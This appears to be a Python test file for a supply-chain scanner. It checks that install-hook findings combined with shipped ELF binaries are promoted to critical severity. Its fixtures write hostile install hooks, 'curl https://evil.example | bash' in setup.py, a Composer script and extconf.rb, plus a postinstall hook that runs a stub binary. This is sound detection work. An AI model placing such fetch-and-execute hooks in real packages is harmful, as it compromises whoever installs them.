"""Composite-scoring integration tests across Phase 5-8 detectors.

The composite chokepoint (Phase 1) maps each detector kind to a
coarse family (HOOK / BINARY / EGRESS / GHA / REGISTRY / PIN /
SQUAT / SENTINEL) and PROMOTES the severity of findings whose dep
participates in a multi-family conjunction.  These tests verify
the chokepoint correctly handles findings emitted by the new
cross-ecosystem adapters (Phase 6) and the binary forensic
machinery (Phase 8) — both of which feed into the SAME family
classification as the original npm install_hooks detector.

Each test asserts that:

  1. The new-adapter finding lands under the right family
  2. The conjunction with a same-dep BINARY-family finding
     promotes the row(s) to ``critical`` via the HOOK+BINARY
     hard-pair rule
"""

from __future__ import annotations

import json
import struct
from pathlib import Path

from packages.sca.models import (
    Confidence,
    Dependency,
    Manifest,
    PinStyle,
)
from packages.sca.supply_chain import evaluate


def _dep(name: str, ecosystem: str, *, declared_in: Path) -> Dependency:
    return Dependency(
        ecosystem=ecosystem,
        name=name,
        version="1.0.0",
        declared_in=declared_in,
        scope="main",
        is_lockfile=False,
        pin_style=PinStyle.EXACT,
        direct=True,
        purl=f"pkg:{ecosystem.lower()}/{name}@1.0.0",
        parser_confidence=Confidence("high", reason="t"),
    )


def _manifest(p: Path, ecosystem: str) -> Manifest:
    return Manifest(path=p, ecosystem=ecosystem, is_lockfile=False)


def _write_elf(p: Path) -> None:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 200)


# ---------------------------------------------------------------------------
# Python HOOK + BINARY conjunction
# ---------------------------------------------------------------------------

def test_python_setup_py_with_curl_pipe_plus_binary_promotes_critical(
    tmp_path: Path,
) -> None:
    """A Python dep where ``setup.py`` matches a dangerous pattern
    AND an ELF binary ships in the same source tree must promote
    to critical via the HOOK+BINARY hard-pair rule."""
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname='victim'\n", encoding="utf-8")
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import os\n"
        "os.system('curl https://evil.example | bash')\n"
        "from setuptools import setup\nsetup()\n",
        encoding="utf-8",
    )
    _write_elf(tmp_path / "tools" / "payload")
    manifests = [_manifest(py, "PyPI")]
    deps = [_dep("victim", "PyPI", declared_in=py)]
    findings = evaluate(tmp_path, manifests, deps)
    # Both HOOK (setup.py dangerous pattern) and BINARY (ELF in
    # tree) families fire on the SAME dep.  Composite must promote.
    hook_findings = [
        f for f in findings if f.kind == "install_hook_suspicious"
    ]
    binary_findings = [
        f for f in findings if f.kind == "binary_in_package"
    ]
    assert hook_findings, "expected hook finding from setup.py"
    assert binary_findings, "expected binary finding from tools/payload"
    # At least one must be promoted to critical via the hard-pair rule.
    critical = [
        f for f in findings
        if f.kind in ("install_hook_suspicious", "binary_in_package")
        and f.severity == "critical"
    ]
    assert critical, (
        f"HOOK+BINARY conjunction must promote to critical; got "
        f"severities {[(f.kind, f.severity) for f in findings]}"
    )


# ---------------------------------------------------------------------------
# Composer HOOK + BINARY conjunction
# ---------------------------------------------------------------------------

def test_composer_dangerous_script_plus_binary_promotes_critical(
    tmp_path: Path,
) -> None:
    """A Composer package with a dangerous post-install-cmd AND a
    binary in the package tree → critical via HOOK+BINARY."""
    cj = tmp_path / "composer.json"
    cj.write_text(json.dumps({
        "name": "vendor/x",
        "scripts": {
            "post-install-cmd": "curl https://evil.example | bash",
        },
    }), encoding="utf-8")
    _write_elf(tmp_path / "tools" / "payload")
    manifests = [_manifest(cj, "Composer")]
    deps = [_dep("vendor/x", "Composer", declared_in=cj)]
    findings = evaluate(tmp_path, manifests, deps)
    critical = [
        f for f in findings
        if f.severity == "critical"
        and f.kind in ("install_hook_suspicious", "binary_in_package")
    ]
    assert critical, (
        f"composer HOOK+BINARY conjunction must promote; got "
        f"{[(f.kind, f.severity) for f in findings]}"
    )


# ---------------------------------------------------------------------------
# RubyGems HOOK + BINARY conjunction
# ---------------------------------------------------------------------------

def test_rubygems_extconf_dangerous_plus_binary_promotes_critical(
    tmp_path: Path,
) -> None:
    """RubyGems extconf.rb with a dangerous pattern + binary in
    tree → critical.  Passes a Gemfile manifest so both detectors
    attribute findings to the same host dep (the realistic shape
    for a RubyGems project)."""
    gemfile = tmp_path / "Gemfile"
    gemfile.write_text(
        'source "https://rubygems.org"\ngem "victim"\n',
        encoding="utf-8",
    )
    ext_dir = tmp_path / "ext" / "victim"
    ext_dir.mkdir(parents=True)
    extconf = ext_dir / "extconf.rb"
    extconf.write_text(
        'system("curl https://evil.example | bash")\n'
        'require "mkmf"\ncreate_makefile("victim")\n',
        encoding="utf-8",
    )
    _write_elf(tmp_path / "tools" / "payload")
    manifests = [_manifest(gemfile, "RubyGems")]
    deps = [_dep("victim", "RubyGems", declared_in=gemfile)]
    findings = evaluate(tmp_path, manifests, deps)
    critical = [
        f for f in findings
        if f.severity == "critical"
        and f.kind in ("install_hook_suspicious", "binary_in_package")
    ]
    assert critical


# ---------------------------------------------------------------------------
# Phase 8 forensic-promoted binary still composes correctly
# ---------------------------------------------------------------------------

def _write_elf_with_imports(p: Path, imports: list) -> None:
    """Build a minimal ELF64 with given UNDEF dynsym imports."""
    p.parent.mkdir(parents=True, exist_ok=True)
    dynstr_chunks = [b"\x00"]
    offsets = []
    for name in imports:
        offsets.append(sum(len(c) for c in dynstr_chunks))
        dynstr_chunks.append(name.encode("ascii") + b"\x00")
    dynstr = b"".join(dynstr_chunks)
    dynsym = struct.pack("<IBBHQQ", 0, 0, 0, 0, 0, 0)
    for off in offsets:
        dynsym += struct.pack("<IBBHQQ", off, 0x12, 0, 0, 0, 0)
    shstrtab = b"\x00.shstrtab\x00.dynstr\x00.dynsym\x00"
    sh_names = {
        ".shstrtab": shstrtab.find(b".shstrtab\x00"),
        ".dynstr":   shstrtab.find(b".dynstr\x00"),
        ".dynsym":   shstrtab.find(b".dynsym\x00"),
    }
    EHSIZE = 64
    SHENTSIZE = 64
    body = bytearray()
    body += b"\x00" * EHSIZE
    shstr_off = len(body)
    body += shstrtab
    dynstr_off = len(body)
    body += dynstr
    dynsym_off = len(body)
    body += dynsym
    while len(body) % 8 != 0:
        body += b"\x00"
    shoff = len(body)

    def _sh(sh_name_off, sh_type, sh_flags, sh_offset, sh_size,
            sh_link, sh_entsize):
        return struct.pack(
            "<IIQQQQIIQQ",
            sh_name_off, sh_type, sh_flags, 0,
            sh_offset, sh_size, sh_link, 0, 8, sh_entsize,
        )
    body += _sh(0, 0, 0, 0, 0, 0, 0)
    body += _sh(sh_names[".shstrtab"], 3, 0,
                shstr_off, len(shstrtab), 0, 0)
    body += _sh(sh_names[".dynstr"], 3, 0, dynstr_off, len(dynstr), 0, 0)
    body += _sh(sh_names[".dynsym"], 11, 0,
                dynsym_off, len(dynsym), 2, 24)
    body[:EHSIZE] = struct.pack(
        "<4sBBBBBBBBBBBBHHIQQQIHHHHHH",
        b"\x7fELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        2, 0x3E, 1, 0, 0, shoff, 0,
        EHSIZE, 0, 0, SHENTSIZE, 4, 1,
    )
    p.write_bytes(bytes(body))


def test_runtime_privilege_binary_plus_hook_promotes_critical(
    tmp_path: Path,
) -> None:
    """An ELF with ``ptrace``/``setuid`` imports (Phase 8 forensic
    promotes to high standalone) PLUS a hook on the same dep —
    composite must promote to critical via HOOK+BINARY."""
    pkg = tmp_path / "package.json"
    pkg.write_text(json.dumps({
        "name": "rootkit-pkg",
        "version": "1.0.0",
        "scripts": {"postinstall": "./tools/payload"},
    }), encoding="utf-8")
    _write_elf_with_imports(
        tmp_path / "tools" / "payload",
        ["ptrace", "setuid", "fork"],
    )
    manifests = [_manifest(pkg, "npm")]
    deps = [_dep("rootkit-pkg", "npm", declared_in=pkg)]
    findings = evaluate(tmp_path, manifests, deps)
    # Hook should fire (mediium via intree_has_binary), binary
    # fires high (Phase 8 forensic promotion).  Composite must
    # promote both / at least one to critical.
    critical = [
        f for f in findings
        if f.severity == "critical"
        and f.kind in ("install_hook_suspicious", "binary_in_package")
    ]
    assert critical, (
        f"runtime_privilege binary + hook on same dep must promote "
        f"to critical; got {[(f.kind, f.severity) for f in findings]}"
    )


# ---------------------------------------------------------------------------
# Commit-provenance PIN family composes with other families
# ---------------------------------------------------------------------------

def test_commit_provenance_classified_under_pin_family() -> None:
    """``commit_provenance_drift`` belongs to the PIN family per the
    composite map.  Smoke-test the mapping is registered."""
    from packages.sca.supply_chain.composite import _FAMILY
    assert _FAMILY.get("commit_provenance_drift") == "PIN"


# ---------------------------------------------------------------------------
# No-conjunction case — only one family → no promotion
# ---------------------------------------------------------------------------

def test_setup_py_only_no_composite_promotion(tmp_path: Path) -> None:
    """A Python dep where ONLY the HOOK family fires (no binary, no
    other family) must NOT be composite-promoted."""
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname='only-hook'\n", encoding="utf-8")
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import os\nos.system('curl https://x | bash')\n"
        "from setuptools import setup\nsetup()\n",
        encoding="utf-8",
    )
    manifests = [_manifest(py, "PyPI")]
    deps = [_dep("only-hook", "PyPI", declared_in=py)]
    findings = evaluate(tmp_path, manifests, deps)
    hooks = [f for f in findings if f.kind == "install_hook_suspicious"]
    assert hooks
    # Original severity should be ``high`` (pattern match), NOT
    # promoted to critical (no second family co-fires).
    assert all(f.severity == "high" for f in hooks)
